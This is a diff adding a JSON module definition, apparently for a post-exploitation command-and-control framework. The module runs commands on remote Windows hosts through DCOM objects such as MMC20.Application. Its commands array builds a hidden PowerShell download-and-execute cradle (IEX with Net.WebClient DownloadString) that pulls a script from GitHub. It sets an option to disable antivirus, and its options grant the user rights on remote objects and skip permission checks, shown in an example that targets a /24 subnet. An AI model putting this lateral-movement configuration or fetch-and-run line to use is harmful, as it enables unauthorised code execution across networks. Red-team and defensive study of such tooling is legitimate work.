@@ -1,0 +1,50 @@
+{
+  "base": {
+    "type": "standard",
+    "name": "Invoke-ExecutionCommand",
+    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+    "credits": ["Nimrod Levy (@el3ct71k)"],
+    "path": ["windows", "x64", "powershell", "lateral", "dcom", "Invoke-ExecutionCommand.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "PowerShell",
+    "privilege": false,
+    "notes": "\r\n\r\nInvoke-ExecutionCommand is part of the D(COM) V(ulnerability) S(canner) (DVS) Framework at https://github.com/ScorpionesLabs/DVS.\r\n\r\nExample:\r\nSet Frame.Top attribute to 1 Finally, revert the machine to the same state as before the attack.\r\nPS> Invoke-ExecutionCommand -ObjectName \"MMC20.Application\" -AutoGrant -Commands @( @{ObjectPath=\"Document.ActiveView.ExecuteShellCommand\"; Arguments=@('cmd.exe',$null,\"/c calc\",\"Minimized\")},@{ObjectPath=\"Frame.Top\";Arguments=@(1)} ) -HostList \"10.211.55.1/24\" -Verbose\r\n",
+    "local": ["data", "src", "ScorpionesLabs", "DVS", "DVS.psm1"],
+    "options": [
+      {"name": "ObjectName", "value": "MMC20.Application", "required": true, "flag": "-ObjectName", "description":"Specifies the exact DCOM Object to grant."},
+      {"name": "Commands", "value": "@( @{ObjectPath=\"Document.ActiveView.ExecuteShellCommand\"; Arguments=@('cmd.exe',$null,\"/c calc\",\"Minimized\")},@{ObjectPath=\"Frame.Top\";Arguments=@(1)} )", "required": true, "flag": "-Commands", "description":"Specifies the commands inside a list."},
+      {"name": "HostList", "value": null, "required": false, "flag": "-HostList", "description":"Specifies IPAddresses, CIDR ranges or hostnames to interact with (Default: 127.0.0.1)."},
+      {"name": "Username", "value": null, "required": false, "flag": "-Username", "description":"Specifies the username to use for access."},
+      {"name": "Password", "value": null, "required": false, "flag": "-Password", "description":"Specifies the password to use for access."},
+      {"name": "AutoGrant", "value": null, "required": false, "flag": "-AutoGrant", "description":"AutoGrant mode allows you to grant yourself permission to the remote DCOM object."},
+      {"name": "SkipPermissionChecks", "value": null, "required": false, "flag": "-SkipPermissionChecks", "description":"Try to blindly launch the remote object, without checking if the principal-identity have access to it using (Will not analyze ACL permissions)."},
+      {"name": "SkipRegAuth", "value": null, "required": false, "flag": "-SkipRegAuth", "description":""},
+      {"name": "Verbose", "value": null, "required": false, "flag": "-Verbose", "description":"Get Verbose logging"}
+    ],
+    "description": "Invoke-ExecutionCommand function executes commands via DCOM Object using the logged-on user or provided credentials.",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w", "0",
+      "\"IEX",
+      "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ScorpionesLabs/DVS/master/DVS.psm1');",
+      "Invoke-ExecutionCommand",
+      "{{ObjectName}}",
+      "{{Commands}}",
+      "{{HostList}}",
+      "{{Username}}",
+      "{{Password}}",
+      "{{AutoGrant.Flag}}",
+      "{{SkipPermissionChecks.Flag}}",
+      "{{SkipRegAuth.Flag}}",
+      "{{Verbose.Flag}}",
+      "\""
+    ]
+  },
+  "powershell": {
+    "disableav": true,
+    "obfuscate": false,
+    "base64": false
+  }
+}
